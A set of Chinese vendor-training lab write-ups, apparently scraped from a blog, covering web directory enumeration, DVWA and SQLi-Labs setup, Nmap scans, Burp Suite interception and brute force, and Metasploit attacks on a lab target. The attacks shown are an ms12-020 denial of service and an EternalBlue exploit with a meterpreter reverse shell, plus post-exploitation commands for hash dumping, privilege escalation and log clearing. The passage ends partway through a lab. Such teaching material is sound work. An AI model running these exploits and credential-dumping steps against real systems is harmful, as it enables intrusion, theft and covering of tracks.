二、Dirb工具探测Web目录1、查看Dirb工具的帮助。 使用dirb命令，输出相关帮助内容。 图中2处表明，Dirb使用的语法，即，在后面跟上基本的url基地址，再在后面加上指定的常用路径字典； 图中3处表明，Dirb相关的选项参数，在需要使用相关参数时，添加在dirb命令后面即可，如路径字典后面。 2、DVWA主机Web目录探测 按照dirb命令语法结构，构建探测命令。在终端中，输入命令： 1dirb http://IP /usr/share/wordlists/dirb/common.txt 其中IP为DVWA主机地址，截图中DVWA主机的IP地址为192.168.17.195。 使用的路径字典为/usr/share/wordlists/dirb/common.txt，在同级目录下，还存在其它字典，根据需要加载即可。 由上图可见，通过指定字典，总共尝试4612次，其中成功猜解出2个地址。 加载其它字典，可自行尝试。 三、DirBuster工具探测Web目录Dirbuster在终端中启动后，会出现图形界面，配置相关参数并进行使用。 1、启动Dirbuster工具。 输入命令dirbuster后，工具自行启动，如下图所示。 2、配置相关参数。 对DVWA测试前，需完成相关参数配置，如下图所示。 点击start后，工作界面如下图所示，从图中可知，当前进度为38%（第1处），总共将发起的请求数为87655次，现在已发出33374次请求（第2处）。 3、探测结果 在第2步中所探测结果显示，仅有两个地址猜解成功，如下图所示。 猜解结果同所需字典息息相关，将字典调整为dirb路径下的common.txt，再次探测，配置如下图所示。 结果如下图所示。 Dirbuster工具还给出了资源的树状结构，如下图所示。 实验至此结束。 实验总结通过在实验环境中，实际操作体验了两款Web目录探测工具，通过对靶机发送实际的交互数据，对web目录进行探测，结合http协议相关原理，有助于理解web目录探测的原理和意义。","tags":["sxf","Red"],"categories":["Experiments"]},{"title":"某厂产业教育 - 下一代防火墙基础原理与运维","path":"/2024/09/13/红蓝攻防/ⅡB下一代防火墙基础原理与运维实验/","content":"","tags":["Blue","sxf"],"categories":["Experiments"]},{"title":"某厂产业教育 - 渗透测试环境搭建与工具使用","path":"/2024/09/13/红蓝攻防/ⅡR渗透测试环境搭建与工具使用/","content":"渗透测试环境搭建与工具使用-基于PHPstudy构建DVWA网站实验目的熟悉PHPstudy集成调试环境的安装与配置，掌握基于PHPstudy构建DVWA网站的方法和流程。 实验环境操作机：pt-env（1）操作系统：Windows 7 （2）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 测试机：Kali2018（1）操作系统：Kali Linux 2018.4 （2）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理PHPstudy是一个PHP调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer，一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境。而DVWA（Damn Vulnerable WebApplication）则是一个用来进行安全脆弱性鉴定的Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助Web开发者更好的理解Web应用安全防范的过程。同时，它也是一款开源的渗透测试漏洞练习平台，基于Apache+MySQL+PHP运行，包含了XSS、SQL注入、文件上传、文件包含、CSRF、暴力破解等各个难度的测试环境。 实验步骤1．安装“微软常用运行库合集”在操作机pt-env上，打开桌面文件夹soft，鼠标左键双击“微软常用运行库合集_v2021.02.23.exe”程序，按照提示完成安装。 2．安装PHPstudy 2018在操作机pt-env上，打开桌面文件夹soft，鼠标左键双击phpstudy2018.exe，运行PHPstudy安装程序： 保持程序默认安装路径（C:\\phpStudy）不变： 安装完成后，出现如下PHPstudy面板界面： 说明：首次安装PHPstudy后，如果不小心关闭了PHPstudy面板，可能会出现“双击PHPstudy的桌面图标，无任何反应”的现象。此时，可以鼠标右键单击任务栏，在弹出的菜单中选择“启动任务管理器”： 在任务管理器中找到PHPstudy进程，将其结束： 再次双击PHPstudy的桌面图标，即可正常启动PHPstudy面板。 3．安装DVWA网站资源（1）在操作机pt-env上，将桌面文件夹soft中的DVWA网站资源包（dvwa文件夹中的全部内容）拷贝到网站根目录（C:\\phpStudy\\PHPTutorial\\WWW）中： （2）拷贝完成后，将C:\\phpStudy\\PHPTutorial\\WWW\\dvwa\\config下的config.inc.php.dist文件（DVWA网站的配置文件）名称修改为config.inc.php，并利用记事本程序打开，将config.inc.php文件中MySQL数据库的连接密码由“p@ssw0rd”修改为“root”： 修改完成后，记得保存文件！ （3）启动PHPstudy： 这里建议将PHP切换为5.x.x的版本： （4）在操作机pt-env上，启动浏览器，输入如下url本地访问DVWA网站： 1http://127.0.0.1/dvwa/ 首次访问时会自动跳转至安装页面（setup.php）： 在此页面最下方，点击“Create&#x2F;Reset Database”按钮，在MySQL中安装dvwa数据库： 安装成功后等待几秒钟，会自动跳转至DVWA网站的认证页面（login.php），输入默认用户名admin、密码password即可成功登录网站。 4．远程登录测试在测试机Kali2018上启动浏览器： 在浏览器地址栏中输入以下URL远程访问DVWA网站： 1http://[操作机IP]/dvwa/ 如果能够正常访问，会直接跳转至DVWA网站的认证页面（login.php），如图所示： 输入默认用户名admin、密码password即可登录。 远程登录测试成功！ 实验至此结束。 实验总结本次实验，成功实现了基于PHPstudy构建DVWA网站，熟悉了渗透测试目标网站环境的构建过程和方法。 渗透测试环境搭建与工具使用-基于WAMP构建SQLi-Labs网站实验目的熟悉WAMP Server集成调试环境的安装与配置，掌握基于WAMP构建SQLi-Labs网站的方法和流程。 实验环境操作机：pt-env（1）操作系统：Windows 7 （2）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 测试机：Kali2018（1）操作系统：Kali Linux 2018.4 （2）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理WAMP即“Windows+Apache+MySQL+PHP”的简称，它是一个软件堆栈，这意味着在操作系统（Windows）上安装Apache、MySQL和PHP。WAMP源自LAMP（L代表Linux），两者之间的唯一区别是WAMP用于Windows操作系统，而LAMP用于基于Linux操作系统。而SQLi-Labs（SQL Injection Libraries）是一款学习SQL注入的开源平台（靶场环境），其中包含了60多种不同类型的注入，总体上基于Apache+MYSQL+PHP运行。 实验步骤1．安装“微软常用运行库合集”在操作机pt-env上，打开桌面文件夹soft，鼠标左键双击“微软常用运行库合集_v2021.02.23.exe”程序，按照提示完成安装。 2．安装WAMP Server在操作机pt-env上，打开桌面文件夹soft，鼠标左键双击wampserver3.1.7_x64.exe，运行WAMP Server安装程序： 保持程序默认安装路径（C:\\wamp64）不变： 安装完成后，桌面会出现如下图标： 3．启动WAMP Server并开通远程访问权限（1）在操作机pt-env上，鼠标左键双击桌面WAMP Server图标，此时在桌面右下角的托盘处也会看到WAMP Server图标： （2）鼠标左键单击托盘处的WAMP Server图标，在菜单中选择“PHP”-&gt;“Version”，将PHP程序版本从默认的7.2.4切换成5.6.40： （3）鼠标左键单击托盘处的WAMP Server图标，在菜单中选择“Apache”-&gt;“httpd.conf”，打开httpd.conf文件： 编辑httpd.conf配置文件，将文件中&lt;Directory “${INSTALL_DIR}&#x2F;www&#x2F;”&gt;标签下的“Require local”修改成“Require all granted”，并保存： （4）鼠标左键单击托盘处的WAMP Server图标，在菜单中选择“Apache”-&gt;“httpd-vhost.conf”，打开httpd-vhost.conf文件： 编辑httpd-vhost.conf配置文件，将文件中的“Require local”修改成“Require all granted”，并保存： （5）鼠标左键单击托盘处的WAMP Server图标，在菜单中选择“Restart All Services”，重启WAMP Server： 重启成功之后，托盘处的WAMP Server图标会变成绿色。 经过上述设置，在WAMP Server下的网站将具备远程访问权限。 4．安装SQLi-Labs网站资源（1）在操作机pt-env上，将桌面文件夹soft中的SQLi-Labs网站资源包（sqli-labs文件夹中的全部内容）拷贝到网站根目录（C:\\wamp64\\www）中： （2）拷贝完成后，进入C:\\wamp64\\www\\sqli-labs\\sql-connections目录，利用记事本程序打开dbcreds.inc文件，确保文件中MySQL数据库的连接密码为空密码： （3）在操作机pt-env上启动浏览器，在地址栏中输入如下URL本地访问SQLi-Labs网站： 1http://127.0.0.1/sqli-labs/ 在网站主页点击“Setup&#x2F;reset Database for labs”，为网站安装数据库： 出现如下提示时，则表明网站安装、初始化成功！ 说明：由于SQLi-Labs网站源代码基于PHP5编写，其中所用到的一些函数（如mysql_connect()）在后续版本的PHP（如PHP7）中被弃用，因此此处出现了一段提示声明，但不影响此网站在PHP5环境下的使用。 5．远程登录测试在测试机Kali2018上启动浏览器： 在浏览器地址栏中输入以下URL远程访问SQLi-Labs网站： 1http://[操作机IP]/sqli-labs/ 如果能够正常访问，会能看到网站的首页： 任意测试一些关卡，如Less-1： 显示正常！远程登录测试成功！ 实验至此结束。 实验总结本次实验，成功实现了基于WAMP构建SQLi-Labs网站，熟悉了渗透测试目标网站环境的构建过程和方法。 渗透测试环境搭建与工具使用-Nmap配置使用1实验目的掌握Nmap的主机发现、端口扫描、版本检测、操作系统侦测等技术的原理及配置使用方法。 实验环境操作机：Kali2018-TS（1）操作系统：Kali Linux 2018.4 （2）登录账号密码：操作系统帐号root，密码Sangfor!7890 靶机：B-SQLi-dvwa（1）操作系统：Windows Server 2003 （2）安装的应用软件：PHPStudy 2013、DVWA漏洞网站环境 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 实验原理Nmap是Linux下一款开源免费的网络发现和安全审计工具。它使用原始IP报文来发现网络上有哪些主机，这些主机提供什么服务（应用程序名和版本），服务运行在什么操作系统，它们使用什么类型的报文过滤器&#x2F;防火墙，以及一些其他功能。Nmap常用参数： 1234567-sP/-sn：Ping扫描（不进行端口扫描）-p：指定扫描的目标端口-sT/-sS/-sA：TCP connect/TCP SYN/TCP ACK扫描-sU：UDP扫描-O：操作系统侦测-sV：应用程序版本探测... 实验步骤1．启动靶机Web环境在靶机B-SQLi-dvwa上，启动phpstudy，启动数据库和Web环境。 2．使用Nmap对靶机进行不同类型的扫描（1）在操作机Kali2018-TS上点击左侧菜单中的终端图标，启动终端： （2）使用如下命令，利用Nmap对靶机进行主机存活检测（主机发现）： 1nmap -sP [靶机IP] 扫描结果：靶机IP地址在线！ （3）使用如下命令，利用Nmap对靶机进行全端口扫描： 1nmap -p T:1-65535,U:1-65535 -sS -sU [靶机IP] 从扫描结果中可以看出，靶机上运行着HTTP、MySQL、远程桌面等服务。 （4）使用如下命令，利用Nmap对靶机进行应用程序版本和操作系统侦测： 1nmap -sV -O [靶机IP] 从扫描结果中可以看出，靶机上运行的操作系统类型为Windows Server 2003，TCP 80端口运行着Apache httpd 2.4.4，PHP环境的版本为5.3.26。 实验至此结束。 实验总结本次实验，熟悉了Nmap的主机发现、端口扫描、版本检测、操作系统侦测等功能的配置使用方法。 渗透测试环境搭建与工具使用-Nmap配置使用2实验目的理解Nmap常用扫描方式的原理，掌握Nmap发包的简单分析方法。 实验环境操作机：Kali2018-TS（1）操作系统：Kali Linux 2018.4 （2）登录账号密码：操作系统帐号root，密码Sangfor!7890 靶机：B-SQLi-dvwa（1）操作系统：Windows Server 2003 （2）安装的应用软件：PHPStudy 2013、DVWA漏洞网站环境 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 实验原理本实验中涉及的Nmap扫描参数： 1234-p：指定扫描的目标端口-sT：TCP connect扫描-sS：TCP SYN扫描-sA：TCP ACK扫描 实验步骤1．启动靶机Web环境在靶机B-SQLi-dvwa上，启动phpstudy，启动数据库和Web环境。 2．使用Nmap对靶机进行不同类型的扫描，并使用WireShark进行抓包观察（1）在操作机Kali2018-TS上点击桌面左上角菜单“Applications”-&gt;“09-Sniffing &amp; Spoofing”-&gt;“Wireshark”，启动Wireshark： 在Wirshark主界面点击“Start capturing packets”按钮启动抓包： 同时，设置如下网络封包过滤条件： 1ip.addr == [操作机IP] （2）在操作机Kali2018-TS上点击左侧菜单中的终端图标，启动终端： （3）使用如下命令，利用Nmap对靶机的80端口进行TCP SYN扫描，并观察Wireshark抓到的网络封包： 1nmap -p 80 -sS [靶机IP] 扫描结果： Wireshark抓包结果： TCP SYN原理分析：Nmap向目标端口发送TCP SYN报文，如果目标机返回TCP SYN+ACK报文，则说明目标端口处于开放状态，同时Nmap会紧接着向目标机发送TCP RST报文以重置此连接；如果目标机返回TCP RST+ACK报文，则说明目标端口处于关闭状态。 （4）使用如下命令，利用Nmap对靶机的80端口进行TCP connect扫描，并观察Wireshark抓到的网络封包： 1nmap -p 80 -sT [靶机IP] 扫描结果： Wireshark抓包结果： TCP connect原理分析：Nmap向目标端口发送TCP SYN报文，如果目标机返回TCPSYN+ACK报文，则说明目标端口处于开放状态，同时Nmap会紧接着向目标机依次发送TCP ACK、TCPRST+ACK完成三次握手和重置此连接；如果目标机返回TCP RST+ACK报文，则说明目标端口处于关闭状态。 （5）使用如下命令，利用Nmap对靶机的80端口进行TCP ACK扫描，并观察Wireshark抓到的网络封包： 1nmap -p 80 -sA [靶机IP] 扫描结果： Wireshark抓包结果： TCP ACK原理分析：Nmap向目标端口发送TCP ACK报文，无论目标端口是否处于开放状态，目标机都会返回TCP RST报文。如果Nmap主机能收到此TCP RST报文，则说明目标端口未被防火墙屏蔽。TCP ACK扫描只能用于确定防火墙是否屏蔽某个端口，可以辅助TCP SYN的方式来判断目标主机防火墙的状况。 实验至此结束。 实验总结本次实验，利用Wireshark辅助分析了Nmap的TCP SYN、TCP connect和TCP ACK等扫描方式的发包过程，验证了这些扫描方式的原理。 渗透测试环境搭建与工具使用-Burpsuite配置使用1实验目的掌握Burpsuite的Proxy模块的用法，熟悉利用Burpsuite拦截、修改和发送HTTP、HTTPS报文的方法和流程。 实验环境操作机：Kali2018-TS（1）操作系统：Kali Linux 2018.4 （2）登录账号密码：操作系统帐号root，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理BurpSuite（简称Burp）是基于Java开发的Web安全领域的集成工具，被称为信息安全界的瑞士军刀，它包含Proxy、Intruder、Repeater、Decoder、Comparer等多个模块，模块间通过共享相互传递HTTP&#x2F;HTTPS消息数据包。其中，核心模块Proxy作为一个在浏览器和目标应用程序之间的中间人，能够拦截、查看、修改在两个方向上的原始HTTP&#x2F;HTTPS数据流。 实验步骤第一部分：拦截HTTP报文1．Firefox浏览器设置（1）正常访问DVWA网站 在操作机Kali2018-TS上启动Firefox浏览器，输入以下URL访问靶机上的DVWA网站： 1http://[靶机IP]/dvwa/ （注意大小写） （2）设置Firefox代理 在Firefox浏览器界面，点击菜单按钮，选择“Preferences”: 在“General”-&gt;“Network Proxy”处点击“Settings”按钮： 在此处设置如下图所示的代理参数，并点击“OK”按钮确认： 1234代理方式： “Manual Proxy configuration”HTTP Proxy： 127.0.0.1Port: 8090选项“Use this proxy server for all protocols”钩选。 2．启动Burpsuite并进行代理设置（1）启动Burpsuite 在操作机Kali2018-TS上启动Burpsuite： （2）设置Burpsuite的代理服务端口 在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Options”，在Proxy Listeners模块下，将Burpsuite的代理服务端口设置为8090（与前面Firefox浏览器设置的代理端口保持一致）。 （3）开启Burpsuite的代理拦截功能 在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Intercept”，将拦截开关按钮的状态设置为“Intercept is on”。 注意：上述设置完成之后，不要关闭Burpsuite！ 3．利用Burpsuite工具拦截、修改和发送HTTP请求包回到Firefox浏览器显示的DVWA登录验证界面，输入用户名1、密码1，然后点击Login按钮： 此时Burpsuite会拦截到HTTP请求包： 直接在Burpsuite拦截到的报文（POST包）中，将原始的表单内容修改成： 1username=admin&amp;password=password&amp;Login=Login&amp;...... 修改完成后，多次点击Forward按钮发送此报文： 回到Firefox浏览器界面，发现已正常登录DVWA网站： 第二部分：拦截HTTPS报文说明：此部分实验需要在互联网接入环境下进行！ 默认情况下，Burpsuite无法对HTTPS报文进行拦截，只有在安装相应的数字证书后方可。 1．设置Firefox浏览器代理参数方法同上，略。 2．设置Burpsuite代理参数方法同上，略。 注意设置完成之后，不要关闭Burpsuite！ 3．为Firefox浏览器安装数字证书（1）利用Firefox浏览器访问http://burp或127.0.0.1:8090，点击页面右上侧的“CA Certificate”处下载CA证书（cacert.der）并保存。 （2）在Firefox浏览器上点击右侧菜单按钮，选择“Preferences”: 在“Privacy &amp; Security”-&gt;“Certificates”处点击“View Certificates”按钮： 在弹出的“Certificate Manager”对话框中点击“Import”按钮，将刚刚下载的CA证书（cacert.der）导入： 导入成功后，会在证书列表中看到“PortSwigger”的记录： 4．在Firefox浏览器上访问百度网站，观察Burpsuite是否可以拦截到HTTPS报文（1）在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Intercept”，将拦截开关按钮的状态设置为“Intercept is on”。 （2）重新启动Firefox浏览器，输入以下URL访问百度网站： 1https://www.baidu.com 此时观察到Burpsuite已经拦截到HTTPS报文： 实验至此结束。 实验总结本次实验，熟悉了Burpsuite的Proxy模块的用法，实现了利用Burpsuite拦截、修改和发送HTTP、HTTPS报文的过程。 渗透测试环境搭建与工具使用-Burpsuite配置使用2实验目的掌握Burpsuite的intruder模块的用法，熟悉利用Burpsuite对HTTP登录凭证进行暴力破解的方法和流程。 实验环境操作机：Kali2018-TS（1）操作系统：Kali Linux 2018.4 （2）登录账号密码：操作系统帐号root，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理BurpSuite（简称Burp）是基于Java开发的Web安全领域的集成工具，被称为信息安全界的瑞士军刀，它包含Proxy、Intruder、Repeater、Decoder、Comparer等多个模块，模块间通过共享相互传递HTTP&#x2F;HTTPS消息数据包。其中，Intruder模块在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，Intruder通常会携带一个或多个有效攻击载荷（payload)，在不同的位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。 实验步骤本实验的目标是：利用Burpsuite的Intruder模块对DVWA网站（安全级别为High）的“Brute Force”训练关卡的用户名和密码进行暴力破解。1．访问DVWA网站，进入“Brute Force”训练关卡（1）正常访问DVWA网站 在操作机Kali2018-TS上启动Firefox浏览器，输入以下URL访问靶机上的DVWA网站： 1http://[靶机IP]/dvwa/ （注意大小写） 输入用户名admin、密码password登录： （2）在DVWA网站主页左侧菜单中点击“DVWA Security”，将网站安全级别设置为High： （3）在DVWA网站主页左侧菜单中点击“Brute Force”，进入Brute Force训练关卡： 2．启动Burpsuite并进行代理设置（1）启动Burpsuite 在操作机Kali2018-TS上启动Burpsuite： （2）设置Burpsuite的代理服务端口 在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Options”，在Proxy Listeners模块下，将Burpsuite的代理服务端口设置为8090。 （3）开启Burpsuite的代理拦截功能 在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Intercept”，将拦截开关按钮的状态设置为“Intercept is on”。 注意：上述设置完成之后，不要关闭Burpsuite！ 3．Firefox浏览器代理设置在Firefox浏览器界面，点击菜单按钮，选择“Preferences”: 在“General”-&gt;“Network Proxy”处点击“Settings”按钮： 在此处设置如下图所示的代理参数，并点击“OK”按钮确认： 1234代理方式： “Manual Proxy configuration”HTTP Proxy： 127.0.0.1Port: 8090选项“Use this proxy server for all protocols”钩选。 4．利用Burpsuite工具拦截HTTP请求包，并发送至Intruder模块回到Firefox浏览器显示的DVWA网站“Brute Force”训练关卡界面，输入用户名1、密码1，然后点击Login按钮： 此时Burpsuite会拦截到HTTP请求包： 将此HTTP请求包全部选中，单击鼠标右键，在弹出的菜单中选择“Send to intruder”，将此报文发送至Intruder模块： 5．利用Intruder模块进行暴力破解（1）进入选项卡“Intruder”-&gt;“Positions”，点击右侧的“Clear $”按钮，将默认选中的爆破位置清空： 然后按如下方式指定爆破位置，同时将Attack type设置为“Pitchfork”（草叉模式）： （2）进入选项卡“Intruder”-&gt;“Payloads”： 在此选项卡中设置2个payload set（有效载荷集）： i）第一个payload set选择Custom iterator类型： 同时配置3个占位： 第1个占位为用户名的集合： 第2个占位为固定字符串： 第3个占位为密码的集合： 同时，在Payload Encoding处，禁用对&#x3D;和&amp;进行URL编码： ii）第二个payload set选择Recursive grep类型： （3）进入选项卡“Intruder”-&gt;“Options”： i）在Request Engine处将线程数（Numbers of threads）设置为1： ii）在“Grep-Extract”处设置为递归提取的内容： 注意：选中该token值后，记得复制下来！ iii）在“Redirections”处设置“Follow Redirections”为“always”（总是跟随重定向）： （4）回到选项卡“Intruder”-&gt;“Payloads”，在Payload Options处设置初始token值（即为上个步骤中选中和复制的token值）： （5）点击右上方的“Start attack”按钮执行爆破攻击，并观察结果。 通过请求报文的长度或应答报文的内容判断，正确的用户名为admin，密码为password： 实验至此结束。 实验总结本次实验，熟悉了Burpsuite的Intruder模块的用法，实现了利用Burpsuite对HTTP登录凭证进行暴力破解的过程。 渗透测试环境搭建与工具使用-Metasploit配置使用1实验目的熟悉ms12-020漏洞的原理及利用方法，掌握Metasploit的配置使用方法。 实验环境操作机：Kali2018-TS（1）操作系统：Kali Linux 2018.4 （2）登录账号密码：操作系统帐号root，密码Sangfor!7890 靶机：B-SQLi-dvwa（1）操作系统：Windows Server 2003 （2）安装的应用软件：PHPStudy 2013、DVWA漏洞网站环境 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 实验原理（1）关于MetasploitMetasploit是一个强大的开源平台，可以用来开发、测试和使用恶意代码，同时为渗透测试、shellcode编写和漏洞研究提供了一个可靠平台。 （2）关于ms12-020（Windows远程桌面协议RDP远程代码执行漏洞）微软安全公告KB2671387：远程桌面中的漏洞可能允许远程执行代码 1https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2012/ms12-020 此安全更新可解决远程桌面协议中两个秘密报告的漏洞。如果攻击者向受影响的系统发送一系列特制RDP数据包，则这些漏洞中较严重的漏洞可能允许远程执行代码。默认情况下，任何Windows操作系统都未启用远程桌面协议（RDP），没有启用RDP的系统不受威胁。 实验步骤1．启动Metasploit（1）在操作机Kali2018-TS上点击左侧菜单中的终端图标，启动终端： （2）在终端使用如下命令，启动Metasploit终端（提示符msf&gt;）： 1msfdb init &amp;&amp; msfconsole 2．检测靶机是否存在ms12-020漏洞（1）在Metasploit终端下输入以下命令查找ms12-020相关的模块： 1search ms12-020 搜索的结果中，第一项为ms12-020漏洞利用模块，第二项为ms12-020漏洞检测模块： （2）分别输入以下命令，使用ms12_020_check模块对目标机进行漏洞检测，以确认目标机存在ms12-020漏洞： 1234567use auxiliary/scanner/rdp/ms12_020_check //使用ms12_020_check模块show options //查看该模块需要设置哪些参数set RHOSTS [靶机IP] //设置目标机的IP地址run //执行 检测结果显示，靶机存在ms12-020漏洞！ 3．利用ms12-020漏洞对靶机进行攻击在Metasploit终端下分别输入以下命令，使用ms12_020_maxchannelids模块对目标机的ms12-020漏洞进行利用： 1234567use auxiliary/dos/windows/rdp/ms12_020_maxchannelids //使用ms12_020_maxchannelids模块show options //查看该模块需要设置哪些参数set RHOST [靶机IP] //设置目标机的IP地址run //执行 此时，靶机被攻击后出现蓝屏： 实验至此结束。 实验总结本次实验，成功利用Metasploit工具对存在ms12-020漏洞的靶机进行了攻击，熟悉了ms12-020漏洞的原理及利用方法，同时也掌握了Metasploit的配置使用方法。 渗透测试环境搭建与工具使用-Metasploit配置使用2实验目的熟悉ms17-010漏洞的原理及利用方法，掌握Metasploit的配置使用方法。 实验环境操作机：Kali2018-TS（1）操作系统：Kali Linux 2018.4 （2）登录账号密码：操作系统帐号root，密码Sangfor!7890 靶机：pt-env（1）操作系统：Windows 7 （2）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 实验原理（1）关于MetasploitMetasploit是一个强大的开源平台，可以用来开发、测试和使用恶意代码，同时为渗透测试、shellcode编写和漏洞研究提供了一个可靠平台。 （2）关于ms17-010（Windows SMB远程执行代码漏洞）微软安全公告KB4013389： 1https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010 此安全更新程序修复了Microsoft Windows中的多个漏洞。如果攻击者向 Windows SMBv1服务器发送特殊设计的消息，那么其中最严重的漏洞可能允许远程执行代码。 实验步骤1．启动Metasploit（1）在操作机Kali2018-TS上点击左侧菜单中的终端图标，启动终端： （2）在终端使用如下命令，启动Metasploit终端（提示符msf&gt;）： 1msfdb init &amp;&amp; msfconsole 2．检测靶机是否存在ms17-010漏洞（1）在Metasploit终端中输入以下命令，搜索ms17-010相关的模块： 1search ms17-010 搜索结果： （2）分别输入以下命令，使用smb_ms17_010模块对靶机进行漏洞检测，确认其存在ms17-010漏洞： 1234567use auxiliary/scanner/smb/smb_ms17_010 //使用smb_ms17_010模块show options //查看该模块需要设置哪些参数set RHOSTS [靶机IP] //设置目标机的IP地址run //执行 执行结果显示：靶机存在ms17-010漏洞！ 3．利用ms17-010漏洞对靶机执行溢出攻击（1）分别输入以下命令，使用ms17_010_eternalblue模块对目标机的ms17-010漏洞进行利用： 1234567use exploit/windows/smb/ms17_010_eternalblue //使用ms17_010_eternalblue模块set RHOST [靶机IP] //设置远程主机（靶机）的IP地址set LHOST [操作机IP] //设置本地主机（操作机）的IP地址set payload windows/x64/meterpreter/reverse_tcp //使用payload：meterpreter/reverse_tcpset RPORT 445 //设置目标端口set target 0 //设置目标操作系统类型（此处为自动识别类型） run //执行 溢出攻击成功后，返回meterpreter提示符： 4．后渗透模块meterpreter的使用可以在meterpreter提示符下使用下列命令，进行后渗透操作： 12345678910111213pwd //打印当前工作目录sysinfo // 查看系统信息getuid //获取当前权限的用户idps //查看当前目标机上运行的进程列表和pidgetsystem //获取system权限screenshot //截取目标主机当前屏幕hashdump //获取用户名与hash口令shell //获取目标主机shellupload //上传一个文件download //下载一个文件execute //执行目标系统中的文件（-f指定文件，-i执行可交互模式，-H隐藏窗口）clearev //清除日志background //将meterpreter放入后台（使用sessions -i重新连接到会话） 实验至此结束。 实验总结本次实验，成功利用Metasploit工具对存在ms17-010漏洞的靶机进行了攻击，熟悉了ms17-010漏洞的原理及利用方法，同时也掌握了Metasploit的配置使用方法。 渗透测试环境搭建与工具使用-FireFox浏览器插件配置使用1实验目的了解Firefox浏览常用插件的功能和作用，掌握Hackbar的简单配置与使用。 实验环境操作机：Kali2018-TS（1）操作系统：Kali Linux 2018.4 （2）登录账号密码：操作系统帐号root，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理Web渗透测试时，经常要和浏览器地址栏内容进行交互，比如添加或修改参数、变更URL等。有些服务器的响应包含重定向、重载、参数变化，所有的这些变化的获得需要花费大量的时间去在这些变量上尝试不同的参数，借助合适的工具，可以大大缩短这一过程的繁琐程度。Hackbar是一个Firefox的插件，它的功能类似于地址栏，但是它里面的数据不受服务响应触发的重定向等其它变化的影响，这一功能在我们后面测试Web应用中十分有帮助。 实验步骤1．启动Firefox浏览器及Hackbar插件在操作机Kali2018-TS上启动Firefox浏览器： 启动Firefox浏览器后，按下F12键启动Hackbar： 2．Hackbar插件的简单使用（1）Load和Execute功能的使用 123说明：Load功能：将浏览器地址栏中的URL加载到Hackbar的输入框。Execute功能：执行Hackbar输入框中的URL及参数。 在浏览器地址栏中输入以下URL，访问靶机上的SQLi-Labs网站第1关： 1http://[靶机IP]/sqli-labs/Less-1/ （注意大小写） 在Hackbar界面点击“Load URL”按钮，此时浏览器地址栏中的URL会被加载到Hackbar的输入框中： 在Hackbar输入框中将原URL修改为: 1http://[靶机IP]/sqli-labs/Less-1/?id=1 修改完成后点击“Execute”按钮，观察页面的变化： （2）Split功能的使用 12说明：Split功能：按照URL中的动态参数将URL进行切分。 在当前状态下，直接点击“Split URL”按钮，此时输入框的URL会按动态参数被切分： 此时点击“Execute”按钮，页面显示的结果不变。 （3）Post功能的使用 在Hackbar输入框中输入以下URL，并点击“Execute”按钮，访问SQLi-Labs的第11关： 1http://[靶机IP]/sqli-labs/Less-11/ 在Hackbar界面钩选“Post data”，并在弹出的Post输入框中输入以下内容： 1uname=admin&amp;passwd=admin 输入完成后，点击“Execute”按钮，页面显示成功登录： （4）编码功能的使用 取消“Post data”的钩选，在Hackbar输入框中输入以下URL，并点击“Execute”按钮，访问SQLi-Labs的Less-2： 1http://[靶机IP]/sqli-labs/Less-2/ 将Hackbar输入框中的URL更改为以下URL，并点击“Execute”按钮： 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=1 在Hackbar输入框中，将当前URL中的第二个空格选中，并选择Hackbar菜单项“Encoding”-&gt;“URL Encode”： 最终，空格会被编码成“%20”。 1说明：进行SQL注入时，在特定情况下可以利用编码技术绕过WAF的检查。 在此状态下点击“Execute”按钮，此时页面显示的结果不变。 实验至此结束。 实验总结本次实验，体验了Hackbar的功能及简单配置使用。 渗透测试环境搭建与工具使用-FireFox浏览器插件配置使用2实验目的了解Firefox浏览常用插件的功能和作用，掌握FoxyProxy、User-Agent Switcher的简单配置与使用。 实验环境操作机：Kali2018-TS（1）操作系统：Kali Linux 2018.4 （2）登录账号密码：操作系统帐号root，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理FoxyProxy是一个高级的代理管理插件，能够提高firefox的内置代理的兼容性，可基于URL的参数在一个或多个代理之间进行切换；User-Agent Switcher则可用于改变HTTP头部中的User Agent，利用它可以实现隐藏（伪装）客户端浏览器信息的目的。 实验步骤1．启动Firefox浏览器在操作机Kali2018-TS上启动Firefox浏览器： 实验环境中已预安装FoxyProxy、User-Agent Switcher插件，可以在浏览器界面看到两个插件的图标： 2．启动Burpsuite并进行代理设置（1）启动Burpsuite 在操作机Kali2018-TS上启动Burpsuite： 